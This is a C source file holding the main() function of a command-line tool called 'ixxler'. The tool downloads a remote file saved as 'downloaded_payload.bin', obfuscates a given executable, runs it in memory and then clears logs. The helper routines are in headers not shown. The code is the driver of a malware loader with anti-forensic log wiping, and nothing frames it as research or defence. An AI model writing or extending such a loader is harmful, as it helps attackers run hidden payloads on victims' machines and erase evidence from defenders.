#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"
#include "downloader.h"
#include "obfuscator.h"
#include "memory.h"
#include "logs.h"

void show_help() {
    printf("Usage: ixxler [OPTIONS]\n");
    printf("Options:\n");
    printf("  -f <file>       Path to the executable to process\n");
    printf("  -d <url>        Download file from a URL\n");
    printf("  -t <timeout>    Set the download timeout in seconds\n");
    printf("  -h              Show this help message\n");
}

int main(int argc, char *argv[]) {
    Config config;

    // Step 1: Load runtime configuration
    load_config(&config);

    // Step 2: Parse command-line arguments
    char *download_url = NULL;
    char *file_path = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
            download_url = argv[i + 1];
            i++;
        } else if (strcmp(argv[i], "-f") == 0 && i + 1 < argc) {
            file_path = argv[i + 1];
            i++;
        } else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
            config.timeout = atoi(argv[i + 1]);
            i++;
        } else if (strcmp(argv[i], "-h") == 0) {
            show_help();
            return 0;
        }
    }

    // Step 3: Handle functionality
    if (download_url) {
        printf("[+] Downloading file from: %s\n", download_url);
        char output_path[256];
        snprintf(output_path, sizeof(output_path), "%s/downloaded_payload.bin", config.download_dir);
        if (download_file(download_url, output_path, config.timeout) != 0) {
            fprintf(stderr, "[ERROR] Failed to download file.\n");
            return 1;
        }
    }

    if (file_path) {
        printf("[+] Processing file: %s\n", file_path);
        obfuscate_file(file_path);
        execute_in_memory(file_path);
        clear_logs();
    }

    printf("[+] Task completed successfully!\n");
    return 0;
}
